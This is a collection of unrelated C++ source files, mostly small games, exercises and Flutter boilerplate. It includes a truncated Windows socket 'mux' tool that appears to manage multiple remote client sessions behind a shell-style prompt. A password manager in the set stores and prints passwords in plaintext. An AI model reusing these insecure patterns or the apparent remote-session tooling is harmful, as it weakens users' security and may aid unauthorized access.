    "# include <iostream>\n\n# include <raylib.h>\n\nusing namespace std;\n\nColor Green={38,185,154,255};\n\nColor Dark_Green={20,160,133,255};\n\nColor Light_Green={129,204,184,255};\n\nColor Yellow={243,213,91,255};\n\nint player_score=0;\n\nint cpu_score=0;\n\nclass Ball{\n\npublic:\n\nfloat x,y;\n\nint speed_x,speed_y;\n\nint radius;\n\nvoid Draw(){\n\n DrawCircle(x,y,radius,Yellow);\n\n}\n\nvoid Update(){\n\n    x+=speed_x;\n\n    y+=speed_y;\n\n    if(y+radius>=GetScreenHeight() || y-radius<=0){\n\n        speed_y*=-1;\n\n    }\n\n    if(x+radius>=GetScreenWidth()){\n\n        cpu_score++;\n\n        ResetBall();\n\n    }\n    \n    \n      if(x-radius<=0){\n\n        player_score++;\n         \n        ResetBall();\n\n    }\n\n}\n\nvoid ResetBall(){\n\n      x=GetScreenWidth()/2;\n\n      y=GetScreenHeight()/2;\n\n      int speed_choices[2]={-1,1};\n\n      speed_x*=speed_choices[GetRandomValue(0,1)];\n\n      speed_y*=speed_choices[GetRandomValue(0,1)];\n\n}\n\n};\n\nclass Paddle{\n\nprotected:\n\nvoid LimitMovement(){\n\n if(y<=0){\n\n         y=0;\n\n      };\n\n      if(y+height>=GetScreenHeight()){\n\n          y=GetScreenHeight()-height;\n\n      };\n\n}\n\npublic:\n\nfloat x,y;\n\nfloat width,height;\n\nint speed;\n\nvoid Draw(){\n\n     DrawRectangleRounded(Rectangle{x,y,width,height},0.8,0,WHITE);\n\n}\n\nvoid Update(){\n\n      if(IsKeyDown(KEY_DOWN)){\n\n          y=y+speed;\n\n      }\n\n      if(IsKeyDown(KEY_UP)){\n\n          y=y-speed;\n\n      }\n\n      LimitMovement();\n\n}\n\n\n};\n\nclass CpuPaddle:public Paddle{\n\n public:\n\n void Update(int ball_y){\n\n     if(y+height/2>ball_y){\n\n        y=y-speed;\n\n     }\n\n     if(y+height/2<=ball_y){\n\n          y=y+speed;\n\n     }\n\n     LimitMovement();\n\n }\n\n};\n\nBall ball;\n\nPaddle player;\n\nCpuPaddle cpu;\n\nint main(){\n\n  const int screenWidth=1280;\n\n  const int screenHeight=800;\n\n  InitWindow(screenWidth,screenHeight,\"First Game in C++\");\n\n  SetTargetFPS(60);\n\n  ball.radius=20;\n\n  ball.x=screenWidth/2;\n\n  ball.y=screenHeight/2;\n\n  ball.speed_x=7;\n\n  ball.speed_y=7;\n\n  player.width=25;\n\n  player.height=120;\n\n  player.x=screenWidth-player.width-10;\n\n  player.y=screenHeight/2-player.height/2;\n\n  player.speed=6;\n\n  cpu.height=120;\n\n  cpu.width=25;\n\n  cpu.x=10;\n\n  cpu.y=screenHeight/2-cpu.height/2;\n\n  cpu.speed=6;\n\n\n  //Game Loop\n\n  while(WindowShouldClose()==false){\n\n      //1. Event handling\n\n      //2. Updating positions\n\n      BeginDrawing();\n\n      ball.Update();\n\n      player.Update();\n\n      cpu.Update(ball.y);\n\n      if(CheckCollisionCircleRec(Vector2{ball.x,ball.y},ball.radius,Rectangle{player.x,player.y,player.width,player.height})){\n\n       ball.speed_x*=-1;\n\n      }\n\n      if(CheckCollisionCircleRec(Vector2{ball.x,ball.y},ball.radius,Rectangle{cpu.x,cpu.y,cpu.width,cpu.height})){\n\n        ball.speed_x*=-1;\n\n      }\n\n      //3. Drawing\n\n      ClearBackground(Dark_Green);\n\n      DrawRectangle(screenWidth/2,0,screenWidth/2,screenHeight,Green);\n\n      DrawCircle(screenWidth/2,screenHeight/2,150,Light_Green);\n\n       DrawLine(screenWidth/2,0,screenWidth/2,screenHeight,WHITE);\n\n      ball.Draw();\n\n      cpu.Draw();\n\n      player.Draw();\n\n      DrawText(TextFormat(\"%i\",cpu_score),screenWidth/4-20,20,80,WHITE);\n\n       DrawText(TextFormat(\"%i\",player_score),3*screenWidth/4-20,20,80,WHITE);\n\n      EndDrawing();\n\n  }\n\n  CloseWindow();\n\n  return 0;\n\n}",
    "#include \"Customer.h\"\r\n#include <iostream>\r\n\r\n// Constructor to initialize a customer with ID, first name, and last name\r\nCustomer::Customer(int customerID, const std::string& firstName, const std::string& lastName)\r\n    : customerID(customerID), firstName(firstName), lastName(lastName) {}\r\n\r\n// Destructor to clean up dynamically allocated transactions in the customer's history\r\nCustomer::~Customer() {\r\n    for (Transaction* transaction : transactionHistory) {\r\n        delete transaction;\r\n    }\r\n}\r\n\r\n// Function to add a transaction to the customer's history\r\nvoid Customer::addTransaction(Transaction* transaction) {\r\n    transactionHistory.push_back(transaction);\r\n}\r\n\r\n// Function to display the customer's transaction history\r\nvoid Customer::displayHistory() const {\r\n    std::cout << \"Customer \" << customerID << \" - \" << firstName << \" \" << lastName << std::endl;\r\n    for (Transaction* transaction : transactionHistory) {\r\n        transaction->display();\r\n    }\r\n}\r\n\r\n// Getter for the customer's ID\r\nint Customer::getCustomerID() const {\r\n    return customerID;\r\n}\r\n\r\n// Getter for the transaction history\r\nconst std::vector<Transaction*>& Customer::getTransactionHistory() const {\r\n    return transactionHistory;\r\n}\r\n",
    "#include \"PasswordManager.h\"\n#include <pqxx/pqxx>\n#include <iostream>\n#include <stdexcept>\n#include \"env_parser.h\"\n#include \"cpp-terminal/terminal.hpp\"\n#include \"cpp-terminal/color.hpp\"\n#include <random>\n#include <boost/locale.hpp>\n\nusing namespace std;\n\nstd::string getConnectionString() {\n    auto env_vars = load_env(\"/Users/alexanderkorzh/Desktop/coding/password_manager/.env\");\n\n    auto dbname_it = env_vars.find(\"DATABASE_NAME\");\n    auto user_it = env_vars.find(\"DATABASE_USER\");\n    auto password_it = env_vars.find(\"DATABASE_PASSWORD\");\n    auto host_it = env_vars.find(\"DATABASE_HOST\");\n    auto port_it = env_vars.find(\"DATABASE_PORT\");\n\n    if (dbname_it == env_vars.end() ||\n        user_it == env_vars.end() ||\n        password_it == env_vars.end() ||\n        host_it == env_vars.end() ||\n        port_it == env_vars.end()) {\n        throw std::runtime_error(\"Environment variables for database connection are not set.\");\n    }\n\n    return \"dbname=\" + dbname_it->second +\n           \" user=\" + user_it->second +\n           \" password=\" + password_it->second +\n           \" hostaddr=\" + host_it->second +\n           \" port=\" + port_it->second;\n}\n\nPasswordManager::PasswordManager()\n    : c(getConnectionString())\n{\n    try {\n        pqxx::work tx{c};\n        tx.exec(\"CREATE TABLE IF NOT EXISTS passwords (\"\n                \"domain_name VARCHAR(255) NOT NULL, \"\n                \"login VARCHAR(255) NOT NULL, \"\n                \"password VARCHAR(255) NOT NULL, \"\n                \"PRIMARY KEY (domain_name, login));\");\n        tx.commit();\n        cout << Term::color_fg(Term::Color::Name::Red) << \"Table 'passwords' ensured to exist.\" << Term::color_fg(Term::Color::Name::Default) << endl;\n\n        c.prepare(\"insert_password\", \"INSERT INTO passwords (domain_name, login, password) VALUES ($1, $2, $3);\");\n        c.prepare(\"delete_password_by_domain\", \"DELETE FROM passwords WHERE domain_name = $1;\");\n        c.prepare(\"delete_password_by_login\",\"DELETE FROM passwords WHERE login = $1;\");\n        c.prepare(\"delete_password_by_password\",\"DELETE FROM passwords WHERE password = $1;\");\n        c.prepare(\"delete_password_by_login_and_domain\",\"DELETE FROM passwords WHERE login = $1 AND domain_name = $2;\");\n        c.prepare(\"delete_password_by_login_and_password\",\"DELETE FROM passwords WHERE login = $1 AND password = $2;\");\n        c.prepare(\"delete_password_by_password_and_domain\",\"DELETE FROM passwords WHERE password = $1 AND domain_name = $2;\");\n        c.prepare(\"update_password\", \"UPDATE passwords SET password = $1 WHERE domain_name = $2 AND login = $3;\");\n        c.prepare(\"select_password_by_3\", \"SELECT domain_name, login, password FROM passwords WHERE domain_name = $1 AND login = $2 AND password = $3;\");\n        c.prepare(\"select_password_by_login\",\"SELECT domain_name, login, password FROM passwords WHERE login = $1;\");\n        c.prepare(\"select_password_by_password\",\"SELECT domain_name, login, password FROM passwords WHERE password = $1;\");\n        c.prepare(\"select_password_by_domain\",\"SELECT domain_name, login, password FROM passwords WHERE domain_name = $1;\");\n        c.prepare(\"select_password_by_login_and_password\",\"SELECT domain_name, login, password FROM passwords WHERE login = $1 AND password = $2;\");\n        c.prepare(\"select_password_by_login_and_domain\",\"SELECT domain_name, login, password FROM passwords WHERE login = $1 AND domain_name = $2;\");\n        c.prepare(\"select_password_by_password_and_domain\",\"SELECT domain_name, login, password FROM passwords WHERE password = $1 AND domain_name = $2;\");\n\n    } catch(const pqxx::sql_error &e) {\n        cerr << \"SQL error: \" << e.what() << endl;\n    } catch(const std::exception &e) {\n        cerr << \"Error: \" << e.what() << endl;\n    }\n}\n\nvoid PasswordManager::add_password(std::string domain_name,std::string login,std::string password) {\n    try {\n        PasswordUnit unit(domain_name, login, password);\n        std::string domain_name = boost::locale::conv::to_utf<char>(unit.domain_name, \"UTF-8\");\n        std::string login = boost::locale::conv::to_utf<char>(unit.login, \"UTF-8\");\n        std::string password = boost::locale::conv::to_utf<char>(unit.password, \"UTF-8\");\n\n        std::cout << password << std::endl;\n\n        pqxx::work tx{c};\n        tx.exec_prepared(\"insert_password\", domain_name, login, password);\n        tx.commit();\n    } catch(const boost::locale::conv::conversion_error& e) {\n        cerr << \"Conversion error: \" << e.what() << endl;\n    } catch(const pqxx::sql_error &e) {\n        cerr << \"SQL error: \" << e.what() << endl;\n    } catch(const std::exception &e) {\n        cerr << \"Error: \" << e.what() << endl;\n    }\n}\n\nvoid PasswordManager::remove_password(const std::string& domain_name, const std::string& login, const std::string& password) {\n    try {\n        pqxx::work tx{c};\n        pqxx::result res;\n        if (domain_name.empty() && login.empty() && !password.empty()) {\n            tx.exec_prepared(\"delete_password_by_password\", password);\n        } ",
    "#include <iostream>\nusing namespace std;\n#include <vector>\n\n\n//           Q1 => Fibonacci series using dp\n\n\n\nint fibMemo(int n,vector<int> &dp){\n        // base case\n        if( n==0 || n==1 ){\n            return n;\n        }\n\n        // check for this n is function already call if called then return their value\n        if(dp[n] != -1){\n            return dp[n];\n        }\n\n        // 1 case -> store value in dp array for particular value of n\n        dp[n] = fibMemo(n-1,dp) + fibMemo(n-2,dp);\n\n        return dp[n];\n\n    }\n\n    int fibUsingTab(int n){\n        // create a dp array\n        vector<int> dp(n+1,-1);\n\n        // base case ko dp array mn dalo\n        dp[0] = 0;\n        if(n==0){\n            return 0;\n        }\n        dp[1] = 1;\n\n        // aage ka ans nikalo using recursive relation\n        for(int i=2;i<=n;i++){\n            dp[i] = dp[i-1] + dp[i-2];\n        }\n        return dp[n];\n    }\n\n\n    int fibUsingTabSCO(int n){\n        // create a dp array\n        // vector<int> dp(n+1,-1);\n\n        // base case ko dp array mn dalo\n        // dp[0] = 0;\n        int prev = 0;\n        if(n==0){\n            return 0;\n        }\n        // dp[1] = 1;\n        int curr = 1;\n        if(n==1){\n            return 1;\n        }\n\n        int ans;\n        // aage ka ans nikalo using recursive relation\n        for(int i=2;i<=n;i++){\n            ans = prev + curr;\n            prev = curr;\n            curr = ans;\n        }\n        return ans;\n    } \n\n    int fib(int n) {\n        // making an array of size n initialize with -1\n        // vector<int> dp(n+1,-1);\n        // int ans = fibMemo(n,dp);\n        // return ans;\n\n        // int ans = fibUsingTab(n);\n        // return ans;\n\n        int ans = fibUsingTabSCO(n);\n        return ans;\n\n    }\n};",
    "#include \"bits/stdc++.h\"\r\n\r\nusing namespace std;\r\n\r\ntypedef long long ll;\r\n\r\n#define endl '\\n'\r\n#define ff first\r\n#define ss second\r\n#define pb push_back\r\n#define sz(a) int(a.size())\r\n#define allin(a) begin(a), end(a)\r\n#define file(name)                  \\\r\n   freopen(name \".in\", \"r\", stdin); \\\r\n   freopen(name \".out\", \"w\", stdout);\r\n\r\nconst int mod = 1e9 + 7;\r\nconst int nmax = 1e5 + 7;\r\n\r\nint n, m;\r\nchar a[1007][1007];\r\nbool visited[1007][1007];\r\n\r\nint dx[4] = {-1, 0, 1, 0};\r\nint dy[4] = {0, -1, 0, 1};\r\n\r\nvoid dfs(int i, int j) {\r\n\tvisited[i][j]=true;\r\n\tfor (int k = 0; k < 4; ++k) {\r\n\t\tint i1 = i + dx[k];\r\n\t\tint j1 = j + dy[k];\r\n\t\tif (i1>=1&&i1<=n&&j1>=1&&j1<=m&&a[i1][j1]=='.'&&!visited[i1][j1]) {\r\n\t\t\tvisited[i1][j1]=true;\r\n\t\t\tdfs(i1, j1);\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid bfs(int i, int j) {\r\n\tqueue<pair<int, int>> q;\r\n\tq.push({i, j});\r\n\twhile (!q.empty()) {\r\n\t\tpair<int,int> v = q.front(); q.pop();\r\n\t\tfor (int k = 0; k < 4; ++k) {\r\n\t\t\tint i1 = v.ff + dx[k];\r\n\t\t\tint j1 = v.ss + dy[k];\r\n\t\t\tif (i1>=1&&j1>=1&&j1<=m&&i1<=n&&!visited[i1][j1]&&a[i1][j1]=='.') {\r\n\t\t\t\tvisited[i1][j1]=true;\r\n\t\t\t\tq.push({i1, j1});\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid connectedcomponent() {\r\n\tmemset(visited, 0, sizeof(visited));\r\n\tint cnt=0;\r\n\tfor (int i = 1; i <= n; ++i) {\r\n\t\tfor (int j = 1; j <= m; ++j) {\r\n\t\t\tif (!visited[i][j]&&a[i][j]=='.') {\r\n\t\t\t\tbfs(i, j);\r\n\t\t\t\t++cnt;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\tcout << cnt << endl;\r\n}\r\n\r\nsigned main() {\r\n   cin.tie(nullptr)->sync_with_stdio(false);\r\n   cin >> n >> m;\r\n   for (int i = 1; i <= n; ++i) {\r\n   \tfor (int j = 1; j <= m; ++j) {\r\n   \t\tcin >> a[i][j];\r\n   \t}\r\n   }\r\n   connectedcomponent();\r\n   return 0;\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"dicegamee\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include <SDL.h>\n#include \"Ball.h\"\n#include <vector>\n#include <cstdlib>\n#include <ctime>\n\n// Screen dimensions\nconst int SCREEN_WIDTH = 800;\nconst int SCREEN_HEIGHT = 600;\n\n// Function to generate a random float between min and max\nfloat randFloat(float min, float max) {\n    return min + static_cast<float>(rand()) / (static_cast<float>(RAND_MAX / (max - min)));\n}\n\nint main(int argc, char* args[]) {\n    // Initialize SDL\n    SDL_Init(SDL_INIT_VIDEO);\n\n    // Create an SDL window\n    SDL_Window* window = SDL_CreateWindow(\"Bouncing Balls\", SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, SCREEN_WIDTH, SCREEN_HEIGHT, SDL_WINDOW_SHOWN);\n    // Create an SDL renderer\n    SDL_Renderer* renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED);\n\n    // Initialize random seed\n    srand(static_cast<unsigned>(time(0)));\n\n    // Create a vector to store balls\n    std::vector<Ball> balls;\n\n    // Add 10 balls to the vector with random properties\n    for (int i = 0; i < 10; ++i) {\n        float x = randFloat(50.0f, SCREEN_WIDTH - 50.0f);\n        float y = randFloat(50.0f, SCREEN_HEIGHT - 50.0f);\n        float radius = randFloat(10.0f, 30.0f);\n        float vx = randFloat(-200.0f, 200.0f);\n        float vy = randFloat(-200.0f, 200.0f);\n        SDL_Color color = { static_cast<Uint8>(rand() % 256), static_cast<Uint8>(rand() % 256), static_cast<Uint8>(rand() % 256), 255 };\n        balls.emplace_back(x, y, radius, vx, vy, color);\n    }\n\n    bool quit = false;\n    SDL_Event e;\n    Uint32 startTime = SDL_GetTicks();\n\n    // Main game loop\n    while (!quit) {\n        // Handle events\n        while (SDL_PollEvent(&e) != 0) {\n            if (e.type == SDL_QUIT) {\n                quit = true;\n            }\n        }\n\n        // Calculate delta time\n        Uint32 currentTime = SDL_GetTicks();\n        float deltaTime = (currentTime - startTime) / 1000.0f;\n        startTime = currentTime;\n\n        // Update balls\n        for (auto& ball : balls) {\n            ball.update(deltaTime);\n        }\n\n        // Check for and resolve collisions between balls\n        for (size_t i = 0; i < balls.size(); ++i) {\n            for (size_t j = i + 1; j < balls.size(); ++j) {\n                if (balls[i].checkCollision(balls[j])) {\n                    balls[i].resolveCollision(balls[j]);\n                }\n            }\n        }\n\n        // Clear the screen\n        SDL_SetRenderDrawColor(renderer, 0, 0, 0, 255);\n        SDL_RenderClear(renderer);\n\n        // Render balls\n        for (auto& ball : balls) {\n            ball.render(renderer);\n        }\n\n        // Update the screen\n        SDL_RenderPresent(renderer);\n    }\n\n    // Clean up\n    SDL_DestroyRenderer(renderer);\n    SDL_DestroyWindow(window);\n    SDL_Quit();\n\n    return 0;\n}\n",
    "//#define _MUX_DEBUG 1\n#define _WINSOCK_DEPRECATED_NO_WARNINGS\n#define _CRT_SECURE_NO_WARNINGS\n#include <vector>\n#include <winsock2.h>\n#define Iscint(c) (c>='0' && c <='9') ? 0 : 1\n#define muxhelp \"\\\nUsage: mux [port] [port] [key]\\n\\\n   or: mux [ip] [port] [name]\\n\"\n\nvoid printpath();\nvoid muxserver(int argc, char* argv[]);\nvoid muxclient(int argc, char* argv[]);\nvoid md5(const char* initial_msg, char* digest);\nchar* muxRandom();\n\nint main(int argc, char* argv[]) {\n    WSADATA wsaData;\n    WSAStartup(MAKEWORD(2, 2), &wsaData);\n    switch (argc)\n    {\n    case 1:\n        printf(\"%s\", muxhelp);\n        break;\n    case 2:\n        if (argv[1][0] == 'P' && argv[1][1] == 'H')\n            printpath();\n        else\n            printf(\"%s\", muxRandom());\n        break;\n    case 3:\n        if (Iscint(argv[1][0])) { printf(\"%s\", muxRandom()); break; }\n        if (strchr(argv[1], '.'))\n            muxclient(argc, argv);\n        else\n            printf(\"%s\", muxRandom());\n        break;\n    case 4:\n        if (Iscint(argv[1][0])) { printf(\"%s\", muxRandom()); break; }\n        if (!strchr(argv[1], '.')) //\u4e0d\u5305\u542b.\u4e3a\u7aef\u53e3\n            muxserver(argc, argv);\n        else\n            muxclient(argc, argv);\n        break;\n    default:\n        printf(\"%s\", muxRandom());\n    }\n    WSACleanup();\n}\n\n#include <ws2tcpip.h>\n#include <direct.h>\n#include <thread>\n\n#pragma comment(lib, \"ws2_32.lib\")\n\nint mux_selected = 0; //\u5f53\u524d\u9009\u62e9\u7684\u5ba2\u6237\u7aef\u5e8f\u53f7\nint mux_history_num = 0;\nchar mux_passwd[2048];\nchar mux_history[4096];\nchar muxPasswdHistory[2048];\nBOOL mux_recv_control_check = true;\n\nstruct muxClient {\n    SOCKET s = INVALID_SOCKET;\n    int num = 0;\n    char name[1024];\n    char time[32];\n    char passwdmd5[33];\n    time_t last_active;\n};\n\nstd::vector<muxClient> muxclients;\nstd::vector<WSAPOLLFD> fds;\nSOCKET mux_control = INVALID_SOCKET;\n\nint sendmsg(SOCKET& sock, char* data) {\n    int len = strlen(data);\n    int lindex = 0;\n    while (len > 1024) {\n        int tlen = 1024;\n        send(sock, (char*)&tlen, sizeof(int), 0);\n        send(sock, (data + (1024 * lindex)), tlen, 0);\n        lindex++;\n        len -= 1024;\n    }\n    send(sock, (char*)&len, sizeof(int), 0);\n    send(sock, (data + (1024 * lindex)), len, 0); return 1;\n}\n\nint recvmsg(SOCKET& sock, char* data) {\n    int recvLen;\n    int data_recv = recv(sock, (char*)&recvLen, sizeof(int), 0);\n#ifdef _MUX_DEBUG\n    printf(\"recvmsg[%d]:\", recvLen);\n#endif\n    if (data_recv <= 0) return data_recv;\n    if (recvLen > 1024) recvLen = 1024;\n    data_recv = recv(sock, data, recvLen, 0);\n    if (data_recv <= 0) return data_recv;\n    data[data_recv] = '\\0';\n#ifdef _MUX_DEBUG\n    printf(\"[%d]:'%s'\\n\", data_recv, data);\n#endif\n    if (data_recv == recvLen) return recvLen; return data_recv;\n}\n\nvoid printpath() {\n    char Current_path[1024];\n    char* pwd = _getcwd(Current_path, 1024);\n    printf(\"[%s]$ \", Current_path);\n}\n\nint is_gbk(const char* str) {\n    // \u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3aUnicode\n    int wlen = MultiByteToWideChar(CP_ACP, 0, str, -1, NULL, 0);\n    if (wlen == 0) {\n        // \u8f6c\u6362\u5931\u8d25\uff0c\u4e0d\u662fGBK\u7f16\u7801\n        return 0;\n    }\n    // \u5206\u914d\u7f13\u51b2\u533a\n    wchar_t* wstr = (wchar_t*)malloc(wlen * sizeof(wchar_t));\n    if (wstr == NULL) {\n        // \u5185\u5b58\u5206\u914d\u5931\u8d25\n        return 0;\n    }\n    // \u518d\u6b21\u8fdb\u884c\u8f6c\u6362\n    if (MultiByteToWideChar(CP_ACP, 0, str, -1, wstr, wlen) == 0) {\n        // \u8f6c\u6362\u5931\u8d25\uff0c\u91ca\u653e\u7f13\u51b2\u533a\u5e76\u8fd4\u56de\n        free(wstr);\n        return 0;\n    }\n    // \u68c0\u67e5\u662f\u5426\u6709\u975eGBK\u5b57\u7b26\n    for (int i = 0; i < wlen; i++) {\n        if (wstr[i] > 0x7F && wstr[i] < 0x100) {\n            // \u6709\u975eGBK\u5b57\u7b26\uff0c\u91ca\u653e\u7f13\u51b2\u533a\u5e76\u8fd4\u56de\n            free(wstr);\n            return 0;\n        }\n    }\n    free(wstr);\n    return 1;\n}\n\nvoid mux_write_history(muxClient& _client_, SOCKET& client, const char& _condition) {\n    time_t now = time(NULL);\n    struct tm* sysTime_t = localtime(&now);\n    char title[1024];\n    sprintf_s(title, \"%d-%02d-%02d %02d:%02d:%02d.%03d\",\n        1900 + sysTime_t->tm_year, 1 + sysTime_t->tm_mon, sysTime_t->tm_mday,\n        sysTime_t->tm_hour, sysTime_t->tm_min, sysTime_t->tm_sec, (int)(time(NULL) % 1000)\n    );\n    strcpy_s(_client_.time, title);\n    if (_condition == '+') {\n        _client_.s = client;\n        _client_.num = mux_history_num;\n        _client_.last_active = now;\n        muxclients.push_back(_client_); // \u6dfb\u52a0\u5230\u5ba2\u6237\u7aef\u5217\u8868\n    }\n    if (!strncmp(_client_.name, \"GET\", 3)) return;\n    if (_client_.name[0] == '\\0') return;\n    if (!is_gbk(_client_.name)) return;\n    sprintf_s(\n        title,\n        \"[%s] %c R%d #%d %s\",\n        _client_.time,\n        _condition,\n        _client_.num,\n        muxclients.size() - 1,\n        _client_.name\n    );\n    while ((strlen(mux_history) + strlen(title) + 2) > 4096) {\n        char* pos = strchr(mux_history, '\\n');\n        if (pos != nullptr) {\n            int index = pos - mux_history + 1; // +1 to remove the '\\n'\n            strcpy_s(mux_history, mux_history + index);\n        }\n    }\n    strcat_s(mux_history, title);\n    strcat_s(mux_history, \"\\n\\0\");\n}\n\nvoid mux_server_send(int muxport, char*& passwd) {\n    char buffer[1024];\n    char muxPasswdTime[1024];\n    m",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\nusing namespace std;\n\nvoid playGame()\n{\n    srand(static_cast<unsigned int>(time(0))); // Seed the random number generator\n    int numberToGuess = rand() % 100 + 1; // Generate a random number between 1 and 100\n    int userGuess = 0;\n    int numberOfTries = 0;\n\n    cout << \"Welcome to the Number Guessing Game!\" << endl;\n    cout << \"I have chosen a number between 1 and 100.\" << endl;\n    cout << \"Can you guess what it is?\" << endl;\n\n    while (userGuess != numberToGuess)\n    {\n        cout << \"Enter your guess: \";\n        cin >> userGuess;\n        numberOfTries++;\n\n        if (userGuess < numberToGuess)\n        {\n            cout << \"Too low! Try again.\" << endl;\n        }\n        else if (userGuess > numberToGuess)\n        {\n            cout << \"Too high! Try again.\" << endl;\n        }\n        else\n        {\n            cout << \"Congratulations! You guessed the number in \" << numberOfTries << \" tries.\" << endl;\n        }\n    }\n}\n\nint main()\n{\n    char playAgain = 'y';\n\n    do\n    {\n        playGame();\n        cout << \"Do you want to play again? (y/n): \";\n        cin >> playAgain;\n    } while (playAgain == 'y' || playAgain == 'Y');\n\n    cout << \"Thank you for playing! Goodbye!\" << endl;\n\n    return 0;\n}\n",
    "#include <glad/gl.h>\n#include <GLFW/glfw3.h>\n\n#include <gtest/gtest.h>\n\n#include \"ire/core.hpp\"\n\nusing namespace jvl;\nusing namespace jvl::ire;\n\n// TODO: using vulkan as well...\nbool init_context()\n{\n\tstatic bool initialized = false;\n\tif (initialized)\n\t\treturn true;\n\n\tglfwWindowHint(GLFW_VISIBLE, GLFW_FALSE);\n\tGLFWwindow *window = glfwCreateWindow(800, 800, \"JVL:TEST\", NULL, NULL);\n\tif (window == NULL) {\n\t\tprintf(\"failed to load glfw\\n\");\n\t\tglfwTerminate();\n\t\treturn false;\n\t}\n\n\tglfwMakeContextCurrent(window);\n\n\tif (!gladLoadGL((GLADloadfunc) glfwGetProcAddress)) {\n\t\tprintf(\"failed to load glad\\n\");\n\t\treturn false;\n\t}\n\n\treturn (initialized = true);\n}\n\nvoid check_glsl_source(std::string &source, GLuint stage)\n{\n\tASSERT_TRUE(init_context());\n\n\tGLuint program = glCreateShader(stage);\n\tconst char *source_c_str = source.c_str();\n\tglShaderSource(program, 1, &source_c_str, nullptr);\n\tglCompileShader(program);\n\n\tint success;\n\tchar log[512];\n\n\tglGetShaderiv(program, GL_COMPILE_STATUS, &success);\n\tif (!success) {\n\t\tglGetShaderInfoLog(program, 512, NULL, log);\n\t\tfmt::println(\"compilation error:\\n{}\", log);\n\t}\n\n\tASSERT_TRUE(success);\n}\n\ntemplate <typename T>\nvoid simple_io()\n{\n\tauto shader = []() {\n\t\tlayout_in <T> lin(0);\n\t\tlayout_out <T> lout(0);\n\t\tlout = lin;\n\t};\n\n\tauto kernel = kernel_from_args(shader);\n\tauto glsl = kernel.synthesize(profiles::opengl_450);\n\tcheck_glsl_source(glsl, GL_VERTEX_SHADER);\n}\n\nTEST(ire_synthesize_glsl, simple_int)\n{\n\tsimple_io <int> ();\n}\n\nTEST(ire_synthesize_glsl, simple_float)\n{\n\tsimple_io <float> ();\n}\n\ntemplate <typename T, size_t N>\nvoid simple_vector_io()\n{\n\tauto shader = []() {\n\t\tlayout_in <vec <T, N>> lin(0);\n\t\tlayout_out <vec <T, N>> lout(0);\n\t\tlout = lin;\n\t};\n\n\tauto kernel = kernel_from_args(shader);\n\tauto glsl = kernel.synthesize(profiles::cplusplus_11);\n\tcheck_glsl_source(glsl, GL_VERTEX_SHADER);\n}\n\nTEST(ire_synthesize_glsl, simple_int_2)\n{\n\tsimple_vector_io <int, 2> ();\n}\n\nTEST(ire_synthesize_glsl, simple_float_2)\n{\n\tsimple_vector_io <float, 2> ();\n}\n\nTEST(ire_synthesize_glsl, simple_int_3)\n{\n\tsimple_vector_io <int, 3> ();\n}\n\nTEST(ire_synthesize_glsl, simple_float_3)\n{\n\tsimple_vector_io <float, 3> ();\n}\n\nTEST(ire_synthesize_glsl, simple_int_4)\n{\n\tsimple_vector_io <int, 4> ();\n}\n\nTEST(ire_synthesize_glsl, simple_float_4)\n{\n\tsimple_vector_io <float, 4> ();\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"mustcompany_quest\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
